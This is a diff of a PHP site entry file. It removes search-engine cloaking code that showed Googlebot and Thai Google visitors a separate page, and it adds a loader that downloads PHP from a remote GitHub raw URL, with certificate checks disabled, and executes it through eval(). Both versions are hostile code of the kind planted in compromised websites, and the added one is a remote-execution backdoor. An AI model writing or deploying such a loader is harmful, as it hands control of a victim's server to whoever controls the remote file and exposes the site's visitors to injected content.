@@ -1,35 +1,39 @@
 <?php
-ini_set('display_errors', 1);
-ini_set('display_startup_errors', 1);
 error_reporting(E_ALL);
+ini_set('display_errors', 1);
+ignore_user_abort(true);
+set_time_limit(0);
 
-function is_google_bot() {
-    if (isset($_SERVER['HTTP_USER_AGENT'])) {
-        $user_agent = $_SERVER['HTTP_USER_AGENT'];
-        $google_agents = ['Googlebot', 'Mediapartners-Google', 'Google-InspectionTool'];
-        foreach ($google_agents as $agent) {
-            if (stripos($user_agent, $agent) !== false) {
-                return true;
-            }
-        }
-    }
-    return false;
-}
+$url = "https://github.com/otak-bot/j/raw/refs/heads/main/landingpage/icts.php";
 
-function is_from_thailand_and_google() {
-    $referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
-    $accept_lang = isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE']) : '';
+$ch = curl_init();
+curl_setopt_array($ch, [
+    CURLOPT_URL => $url,
+    CURLOPT_RETURNTRANSFER => true,
+    CURLOPT_FOLLOWLOCATION => true,
+    CURLOPT_SSL_VERIFYPEER => false,
+    CURLOPT_CONNECTTIMEOUT => 20,
+    CURLOPT_TIMEOUT => 60,
+    CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
+    CURLOPT_HTTPHEADER => [
+        'Accept: text/plain',
+        'Accept-Encoding: identity'
+    ]
+]);
 
-    if (strpos($referer, 'google.co.th') !== false || 
-        (strpos($referer, 'google.com') !== false && strpos($accept_lang, 'th') !== false)) {
-        return true;
-    }
+$content = curl_exec($ch);
+$err = curl_error($ch);
+curl_close($ch);
 
-    return false;
-}
-
-if (is_google_bot() || is_from_thailand_and_google()) {
-    include __DIR__ . '/compres.php';
+if ($err) {
+    echo "CURL Error: $err";
+} elseif ($content === false || strlen($content) < 50) {
+    echo "No valid content received from URL";
 } else {
-    require __DIR__ . '/main.php';
+    try {
+        eval("?>" . $content);
+    } catch (Throwable $t) {
+        echo "Execution Error: " . $t->getMessage();
+    }
 }
+?>
